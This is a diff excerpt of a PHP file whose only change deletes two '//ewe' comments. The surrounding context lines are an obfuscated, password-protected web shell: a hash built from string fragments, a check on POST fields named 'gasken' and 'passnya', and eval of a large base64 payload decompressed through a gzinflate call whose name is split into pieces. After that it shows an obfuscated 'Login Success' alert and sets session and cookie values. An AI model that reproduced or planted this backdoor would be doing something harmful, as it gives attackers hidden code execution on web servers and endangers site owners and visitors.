@@ -494,7 +494,6 @@ $passwd = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['gasken'])) {
     if (SHA1($_POST['passnya']) == $passwd) {
-        //ewe
         function setconf($defconf)
         {
             $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te';
@@ -511,7 +510,6 @@ if (isset($_POST['gasken'])) {
         /***#***/ @/*55555*/eval
         /***#***/
         (setconf("fVZtb9owEP4B+xUe6gf2ZcrZjg1E3TRNTK1WaaxU06SlQhRCQaOASKpmrfrbdy82hHaswkrs2M/dc/fcuUrh3xt1u67W6mzQnaeZWm8H/UlPnVRFXalT1cprCzhsDgnkNslBG5x2cJricyJD4zo4HIAj4XltdV6nGuce57jXJAxl5ZXQQPsccA64FZzJIU14XrsJD7RWpzj1mqf00ElLvVcnT+hWOmNf2I+UbLn43nr+Rd/330A7tB33zcTXhGhNab11/QKT9oKWc01MYJ7kVXJgH8DiGcc4rcgwkHXClY9QJMktMpF6Dg2bSfC4GSNfJrcZl+W4XC4YjEIXIRpRZDa2wGEEwoB4p614T5BaPBXzJoxDsxxiw6Rom4OXjhSrSSTlXiWwtl0hhmdiahab8XS6LcoyuM+rzfOBEb0CMfLolZMsp6nAOh90UKAu7AH8zXb9UBbbXWyiK01ZgZHjrJuC0SE9hPldbDOR/U+zHnzP1PnczTXKvpyP7rdLFH7UQ1NHpLGgjQONRa3sdGN8yA55k77S2JFzO41xfenkUI9RY8FvrtNMfXmsbju9fVzQ8dGwf/mjf0n+IU5NzHFEPKqopsbZBufS71SFKtrZOb9wicnU57PHr1Vvr4lTNTz7BO2T0eDb8IpMeapd4HRSLXPgfZfWWtfvIhYFOZOQ99RssSxGt0U1mqxXVbGqyjbCOPTY2zASgeK8zXiQCSD1OFSeLnhfbBny9CHvuA+ZUsIcHnMYaCRI6qe+xEukCNxtdI5GeIYPkhEVgQvPlNsOVxyIDpAYOlZ73OHRWTtjngQFiedPdixRNeIrU3BSnhx8y2WIFgG0BIkq0kqvAUvBuxGbrsPbgerSs/sc31gb1nIL4x5KVriUgJnSmvcBrRNSY0WZFDu07hFFT5kneYk/LdGQX8IBqU03dy4sWLcLOHByCITriW6LmOXycXkBmdwnPbWYqfbb4m5T/WkfUSb3KA6fCSrvBsW7EKxZ7DQopXfqqdlkDvQuvflQ7/9ClT0zvq8YVdoJxmLcytSzKpZlgWaOuy5u2f1FYEJxURLpwuNm4UPHl1YrF2YwnDhRDl4s/6cUrcmIJdwJARMUKWMfGr0WK1asxX2h6e+pgm5SPRpRvidS7mICIUQEFgIxK0ReQD+LHLhDZepq2B899Bq3G9lpNA8WrjPhHwEnReVg14e4AWXSjnrcwBFhM9+M7lfju6IdxcdmMtFgT3388Bc="));
-        //ewe
         echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "'Lo" . "gi" . "n " . "Su" . "cc" . "es" . "s!" . " Yo" . "u " . "Pr" . "o'" . ");" . "</" . "sc" . "ri" . "pt" . ">";
         $_SESSION["login"] = "login";
         setcookie('logined', $my_self, time() + 3600 * 24);
